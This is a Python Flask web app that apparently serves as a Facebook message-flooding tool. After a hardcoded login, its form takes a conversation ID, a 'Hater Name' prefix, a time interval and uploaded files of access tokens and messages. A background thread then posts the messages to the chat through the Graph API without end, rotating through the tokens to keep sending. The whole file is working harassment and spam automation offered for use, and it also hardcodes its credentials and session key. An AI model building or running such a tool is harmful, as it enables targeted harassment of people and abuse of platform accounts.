from flask import Flask, request, render_template_string, redirect, url_for, session
import requests
from threading import Thread, Event
import time
import os
import random
import string

app = Flask(__name__)
app.secret_key = 'secret_key_for_session_management'  # Replace with a strong secret key

USERNAME = "SASKE_SERVER_KING"
PASSWORD = "SASKE_DON"

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    max_tokens = len(access_tokens)
    num_messages = len(messages)
    
    message_index = 0
    while not stop_event.is_set():
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = f"{mn} {messages[message_index % num_messages]}"
            
            parameters = {'access_token': access_token, 'message': message}
            post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            response = requests.post(post_url, json=parameters, headers=headers)
            
            if response.ok:
                print(f"[+] Message Sent: {message} using Token {token_index + 1}")
            else:
                print(f"[x] Failed to send: {message}")
            
            message_index += 1
            time.sleep(time_interval)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(30)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('send_message'))
        else:
            return '''
            <h3>Invalid credentials. Please try again.</h3>
            <a href="/login">Go back to Login</a>
            '''
    return '''
        <html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            background-image: url('https://i.ibb.co/fMd4zHr/0c646d5730820d382cc17e66cc056973.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            font-family: Arial, sans-serif;
        }

        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 0 10px white;
            color: white;
        }

        .login-container h2 {
            text-align: center;
            color: white;
            font-family: cursive;
            margin-bottom: 20px;
        }

        .login-container label {
            display: block;
            margin-bottom: 5px;
            font-size: 16px;
            color: white;
        }

        .login-container input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid white;
            border-radius: 25px; 
            background: transparent;
            color: white;
            font-size: 18px; 
        }

        .login-container input::placeholder {
            color: #ccc;
        }

        .login-container button {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 25px; 
            cursor: pointer;
            font-size: 18px;
        }

        .login-container button:hover {
            background-color: red;
        }

        .login-container .warning {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            color: yellow;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form method="post">
            <h2>Login</h2>
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" placeholder="Enter Username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="warning">
            <p><strong>Note:</strong> For username or password, please contact the admin.</p>
        </div>
    </div>
</body>
</html>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        access_tokens = txt_file.read().decode().strip().splitlines()

        messages_file = request.files['messagesFile']
        messages = messages_file.read().decode().strip().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return '''
        <html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝐗𝐌𝐀𝐑𝐓𝐘 𝐀𝐘𝐔𝐒𝐇 𝐊𝐈𝐍𝐆</title>
    <style>
        label {
            color: white;
        }

        .file {
            height: 30px;
        }

        body {
            background-image: url('https://i.ibb.co/fMd4zHr/0c646d5730820d382cc17e66cc056973.jpg');
            background-size: cover;
            background-repeat: no-repeat;
        }

        .container {
            max-width: 700px;
            height: auto;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            box-shadow: 0 0 10px white;
            border: none;
            resize: none;
        }

        .form-control {
            outline: 1px red;
            border: 1px double white;
            background: transparent;
            width: 100%;
            height: 40px;
            padding: 7px;
            margin-bottom: 10px;
            border-radius: 10px;
            color: white;
        }

        .btn-submit {
            border-radius: 20px;
            align-items: center;
            background-color: #4CAF50;
            color: white;
            margin-left: 70px;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }

        .btn-submit:hover {
            background-color: red;
        }

        h3 {
            text-align: center;
            color: white;
            font-family: cursive;
        }

        h2 {
            text-align: center;
            color: white;
            font-size: 14px;
            font-family: Courier;
        }

        .logout {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .logout a {
            color: white;
            font-size: 16px;
            font-weight: bold;
            text-decoration: none;
            background: red;
            padding: 10px 20px;
            border-radius: 10px;
            transition: background 0.3s;
        }

        .logout a:hover {
            background: darkred;
        }
    </style>
</head>
<body>
    <div class="container">
        <h3>𝐒𝐀𝐒𝐊𝐄𝐄 𝐎𝐅𝐅𝐋𝐈𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑</h3>
        <form method="post" enctype="multipart/form-data">
            <div class="mb-3">
                <label for="threadId">Conversation ID:</label>
                <input type="text" class="form-control" id="threadId" name="threadId" placeholder="Conversation ID" required>
            </div>
            <div class="mb-3">
                <label for="kidx">Hater Name:</label>
                <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Hater Name" required>
            </div>
            <div class="mb-3">
                <label for="time">Time Interval (seconds):</label>
                <input type="number" class="form-control" id="time" name="time" placeholder="Time Interval (seconds)" required>
            </div>
            <div class="mb-3">
                <label for="txtFile">Upload Token File:</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <div class="mb-3">
                <label for="messagesFile">Upload Messages File:</label>
                <input type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" required>
            </div>
            <button type="submit" class="btn btn-primary btn-submit">Start Task</button>
        </form>
        <form method="post" action="/stop">
            <div class="mb-3">
                <label for="taskId">Task ID to stop:</label>
                <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Task ID to stop" required>
            </div>
            <button type="submit" class="btn btn-primary btn-submit">Stop Task</button>
        </form>
        <div class="logout">
            <a href="/logout">Logout</a>
        </div>
        <h3>Made by: Saske Dee Legend</h3>
    </div>
</body>
</html>
    '''

@app.route('/stop', methods=['POST'])
def stop_task():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"Task {task_id} stopped."
    else:
        return f"No task found with ID {task_id}."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
